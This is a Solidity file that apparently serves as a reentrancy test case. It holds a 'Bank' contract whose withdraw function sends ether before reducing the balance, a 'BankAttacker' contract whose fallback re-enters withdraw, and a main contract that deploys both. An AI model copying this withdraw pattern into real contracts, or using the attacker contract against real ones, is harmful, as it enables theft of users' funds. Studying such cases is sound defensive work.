contract Bank {
   mapping(address=>uint) balances;
   uint a = 2;

   function getUserBalance(address user) public view returns(uint result) {
     return balances[user];
   }

   function deposit() public payable {
     balances[msg.sender] += msg.value;
   }

   function withdraw(uint amount) public {
      if(balances[msg.sender] >= amount) {
         msg.sender.call.value(amount)("");
         balances[msg.sender] -= amount;
      }
   }

   function receiveMondy() public payable {

   }

   function getMyBalance() public returns (uint r) {
       return address(this).balance;
   }
}

contract BankAttacker {

   bool attackMode;
   Bank target;

    constructor(address bankAddr, bool attack) public {
       target = Bank(bankAddr);
       attackMode = attack;
   }

   function() external payable {
       if(attackMode == true) {
           attackMode = false;

           target.withdraw(2);
       }
   }

   function addToBalance() public {
       target.deposit.value(2).gas(20764)();
   }

   function withdrawBalance() public{
       target.withdraw(2);
   }

   function getBalance() public returns (uint b) {
       return address(this).balance;
   }

   function receiveMondy() public payable {

   }
}

contract _MAIN_ {
    Bank bank;
    BankAttacker attacker;
    address addr;

    constructor () public {
        bank = new Bank();
        attacker = new BankAttacker(address(bank), true);

        assert(address(bank) != address(attacker));

        addr = address(bank);
        assert(addr == address(bank));
    
    }
}
